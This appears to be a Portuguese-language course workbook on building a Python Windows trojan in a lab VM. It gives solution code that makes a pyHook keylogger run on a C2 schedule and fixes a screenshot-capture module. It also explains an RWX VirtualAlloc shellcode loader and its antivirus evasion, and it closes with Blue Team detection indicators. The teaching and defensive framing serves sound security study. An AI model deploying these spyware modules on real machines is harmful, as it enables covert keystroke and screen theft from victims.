# Caderno de Exercícios Práticos: 02 Trojan Windows (Completo)

**Material de Referência:** `02_GUIA_PRATICO_COMPLETO.md`
**Scripts Base:** `keylogger.py`, `screenshotter.py`, `shell_exec.py`, `sandbox_detect.py`
**Alvo:** VM Windows de laboratório

---

## 🎯 Objetivo Desta Lista

Praticar os detalhes que diferenciam demo de operação real (em lab):
* Correção de `TIMEOUT` com tempo de parede.
* Leitura binária de `.bmp`.
* Entendimento de `VirtualAlloc` RWX.
* Calibragem de thresholds de sandbox + visão Blue Team.

---

## Exercício 2.1 — Corrigindo o TIMEOUT do Keylogger

### Enunciado
Troque `time.thread_time()` (CPU) por `time.time()` (parede) para garantir 10 minutos reais.

### Tarefas
1. Substitua o `while` por `start = time.time(); while (time.time() - start) < TIMEOUT:`.
2. Troque `def run():` por `def run(**args):` (padrão do C2).
3. Rode por 1 min com `TIMEOUT = 60` temporário e confirme que encerra.

### Resolução Sugerida
```python
def run(**args):
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
    start = time.time()
    while (time.time() - start) < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log
```

---

## Exercício 2.2 — Screenshot Binário + Tamanho do Arquivo

### Enunciado
O `run()` original abre `.bmp` em modo texto (`"r"`), o que corrompe bytes. Corrija para `"rb"` e meça o tamanho.

### Tarefas
1. Troque `open('screenshot.bmp')` por `open('screenshot.bmp', 'rb')`.
2. Após `img = f.read()`, imprima `len(img)` e salve cópia com timestamp.
3. Discuta: por que o C2 precisa de `base64` para este retorno?

### Resolução Sugerida
```python
def run(**args):
    screenshot()
    with open('screenshot.bmp', 'rb') as f:
        img = f.read()
    print(f"[*] Screenshot: {len(img)} bytes.")
    return img
```

---

## Exercício 2.3 — Entendendo o `VirtualAlloc` (sem executar)

### Enunciado
Sem rodar shellcode real, explique cada flag e some um log seguro.

### Tarefas
1. Pesquise: o que significam `0x3000` (MEM_COMMIT|MEM_RESERVE) e `0x40` (PAGE_EXECUTE_READWRITE)?
2. Adicione `print(f"[*] Alocando {length} bytes RWX...")` em `write_memory`.
3. Responda: por que "sem tocar o disco" dificulta o antivírus? (resposta: só memória, sem assinatura de arquivo).

### Resolução Sugerida
```python
def write_memory(buf):
    length = len(buf)
    print(f"[*] Alocando {length} bytes RWX em memória...")
    # ... resto igual, NÃO chame run() sem o professor ...
```

---

## Exercício 2.4 — Blue Team: Detectando os 4 Módulos

### Enunciado
Para cada módulo, proponha 1 indicador que o defensor monitoraria.

### Tarefas
1. Keylogger: chamadas a `SetWindowsHookEx` / `GetAsyncKeyState` fora de app acessível.
2. Screenshot: `BitBlt` + criação frequente de `.bmp` + upload grande em base64.
3. Shellcode: `VirtualAlloc` com `PAGE_EXECUTE_READWRITE` + conexão HTTP para `shellcode.bin`.
4. Escreva um parágrafo: qual ferramenta (Sysmon/EDR) logaria cada evento?

### Resposta Sugerida para Discussão em Sala
* **Sysmon Event ID 8 (CreateRemoteThread) + 10 (ProcessAccess)** para injeção/hook; **Event ID 3 (NetworkConnect)** para `api.github.com:443` e `http://...:8100/shellcode.bin`; regra de **AppLocker** bloqueando `pyWinhook` fora de diretório permitido + EDR sinalizando `PAGE_EXECUTE_READWRITE`.
